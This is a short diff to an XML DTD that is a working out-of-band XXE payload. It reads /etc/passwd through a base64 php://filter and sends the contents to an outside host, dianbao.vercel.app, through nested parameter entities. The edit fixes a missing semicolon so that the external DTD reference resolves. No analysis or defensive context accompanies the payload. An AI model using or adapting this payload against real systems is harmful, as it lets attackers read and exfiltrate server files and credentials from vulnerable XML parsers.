@@ -6,6 +6,6 @@
 <!ELEMENT root (#PCDATA)>
 <!ENTITY % zfile SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
 <!ENTITY % youknow SYSTEM "https://dianbao.vercel.app/send/3AD2781AD6E69/ESON">
-%youknow
+%youknow;
 <!ENTITY % al "<!ENTITY hello SYSTEM 'http://dianbao.vercel.app/send/3AD2781AD6E69/ESON%zfile;'>">
 %al;
